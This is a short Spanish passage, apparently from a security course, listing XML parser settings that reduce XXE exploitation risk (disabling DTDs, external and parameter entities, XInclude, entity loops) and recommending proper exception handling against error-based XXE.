Además de usar las bibliotecas XML más recientes, ciertas configuraciones XML para aplicaciones web pueden ayudar a reducir la posibilidad de explotación de XXE. Éstos incluyen:

-   Deshabilitar la referencia personalizada `Document Type Definitions (DTDs)`
-   Deshabilitar la referencia `External XML Entities`
-   Deshabilitar procesamiento de `Parameter Entity`
-   Deshabilitar soporte para `XInclude`
-   Prevenir`Entity Reference Loops`

Otra cosa que vimos fue la explotación XXE basada en errores. Por lo tanto, siempre debemos tener un manejo de excepciones adecuado en nuestras aplicaciones web







